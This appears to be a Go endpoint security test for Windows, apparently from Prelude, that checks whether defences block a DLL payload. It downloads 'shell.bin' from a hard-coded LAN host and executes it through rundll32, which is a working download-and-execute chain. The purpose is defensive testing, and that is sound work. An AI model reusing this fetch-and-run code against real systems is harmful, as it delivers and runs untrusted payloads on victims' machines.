//go:build windows
// +build windows

/*
ID: unique-id-dllmain
NAME: Malicious DLL Main Detection
CREATED: 2024-07-02
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"net/http"
	"io"
	"syscall"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting Malicious DLL Main Detection VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	url := "http://192.168.231.133/shell.bin"
	tmpPath := os.TempDir() + "\\payload.bin"

	// Simulate fetching the payload
	err := downloadFile(url, tmpPath)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to download payload: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// Simulate loading the DLL and executing payload
	command := fmt.Sprintf("rundll32.exe %s,Attack", tmpPath)
	out, err := exec.Command("cmd.exe", "/C", command).CombinedOutput()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to execute payload: %s", string(out)))
		Endpoint.Stop(1) // ERROR
	}

	Endpoint.Say("[+] Payload executed successfully")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func cleanup() {
	tmpPath := os.TempDir() + "\\payload.bin"
	os.Remove(tmpPath)
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}

func downloadFile(url, path string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	return err
}
